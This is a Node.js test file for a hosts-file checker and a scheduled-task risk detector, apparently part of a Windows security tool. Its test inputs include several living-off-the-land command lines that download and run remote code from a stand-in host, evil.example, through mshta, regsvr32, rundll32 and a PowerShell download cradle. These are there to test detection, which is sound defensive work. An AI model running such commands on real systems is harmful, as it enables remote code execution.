'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const hostsFileCheck = require('../src/scripts/safeScripts/hostsFileCheck');
const scheduledTasksReport = require('../src/scripts/safeScripts/scheduledTasksReport');

describe('hostsFileCheck parseHostsFile', () => {
  it('skips comments, blank lines, and default entries', () => {
    const content = [
      '# comment',
      '',
      '127.0.0.1 localhost',
      '::1 localhost',
      '255.255.255.255 broadcasthost',
      '0.0.0.0 example.com'
    ].join('\n');
    const entries = hostsFileCheck.parseHostsFile(content);
    assert.equal(entries.length, 1);
    assert.equal(entries[0].host, 'example.com');
  });

  it('flags hosts that redirect security or update domains', () => {
    const content = '0.0.0.0 update.microsoft.com\n10.0.0.5 defender.somewhere.net\n127.0.0.1 games.example.com';
    const entries = hostsFileCheck.parseHostsFile(content);
    const flagged = entries.filter((e) => e.flagged);
    assert.equal(flagged.length, 2, 'update.microsoft.com and defender hit');
    assert.ok(flagged.every((e) => e.flagReason));
  });

  it('handles inline comments and multiple hosts per line', () => {
    const content = '0.0.0.0 site1.example.com site2.example.com # tracking';
    const entries = hostsFileCheck.parseHostsFile(content);
    assert.equal(entries.length, 2);
    assert.deepEqual(entries.map((e) => e.host), ['site1.example.com', 'site2.example.com']);
  });

  it('reports supported:false for a missing hosts file', async () => {
    const result = await hostsFileCheck('C:\\definitely\\missing\\hosts');
    assert.equal(result.supported, false);
  });

  it('caps returned entries while keeping the full count', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hosts-'));
    try {
      const hostsPath = path.join(dir, 'hosts');
      const lines = [];
      for (let i = 0; i < 1200; i++) lines.push(`0.0.0.0 host${i}.example.com`);
      fs.writeFileSync(hostsPath, lines.join('\n'));

      const result = await hostsFileCheck(hostsPath);
      assert.equal(result.entryCount, 1200, 'full count reported');
      assert.equal(result.entries.length, 500, 'render-bound entries capped');
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('scheduledTasksReport actionLooksRisky', () => {
  it('flags actions running from world-writable or temp locations', () => {
    for (const action of [
      'C:\\Windows\\Temp\\payload.exe',
      'C:\\Users\\a\\AppData\\Roaming\\x.exe',
      'C:\\Users\\a\\AppData\\Local\\Temp\\x.exe',
      'C:\\Users\\Public\\x.exe'
    ]) {
      const risk = scheduledTasksReport.actionLooksRisky(action);
      assert.equal(risk.flagged, true, action);
      assert.ok(risk.reason);
    }
  });

  it('does not flag ProgramData actions (legit updater tasks live there)', () => {
    const risk = scheduledTasksReport.actionLooksRisky('C:\\ProgramData\\SomeApp\\updater.exe');
    assert.equal(risk.flagged, false);
  });

  it('does not flag a plain PowerShell invocation', () => {
    const risk = scheduledTasksReport.actionLooksRisky('powershell.exe -File "C:\\Program Files\\MyApp\\maintenance.ps1"');
    assert.equal(risk.flagged, false);
  });

  it('flags script hosts invoked with obfuscated or remote arguments', () => {
    for (const action of [
      'powershell.exe -EncodedCommand SQBFAFgA',
      'mshta.exe http://evil.example/payload.hta',
      'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "',
      'regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll',
      'powershell.exe -Command "iex (New-Object Net.WebClient).DownloadString(\'http://x/y\')"'
    ]) {
      const risk = scheduledTasksReport.actionLooksRisky(action);
      assert.equal(risk.flagged, true, action);
      assert.ok(risk.reason);
    }
  });

  it('returns not flagged for empty or missing actions', () => {
    assert.equal(scheduledTasksReport.actionLooksRisky(null).flagged, false);
    assert.equal(scheduledTasksReport.actionLooksRisky('').flagged, false);
  });
});
